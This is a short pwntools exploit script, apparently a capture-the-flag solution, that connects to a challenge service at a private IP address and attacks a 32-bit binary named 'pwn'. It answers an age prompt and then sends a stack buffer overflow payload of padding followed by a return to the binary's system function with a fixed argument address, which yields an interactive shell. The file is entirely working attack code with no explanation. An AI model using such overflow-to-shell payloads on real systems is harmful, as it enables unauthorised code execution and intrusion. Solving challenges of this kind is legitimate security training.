from pwn import * 
from pwn import p32


debug = 0
gdb_is = 0
context(arch='i386',os = 'linux', log_level='DEBUG')
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
    
else:
    host = "192.168.0.111:27332"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x00401571')
    gdb.attach(r)
    
    pass

elf = ELF('./pwn')
payload = b'A'* 84 + b'junk' +p32(0)+ p32(elf.sym['system']) + p32(0) +p32(0x804C02C)
r.sendlineafter(b'age?',b'120')
pause()
r.sendafter(b'ow!',payload)

r.interactive()
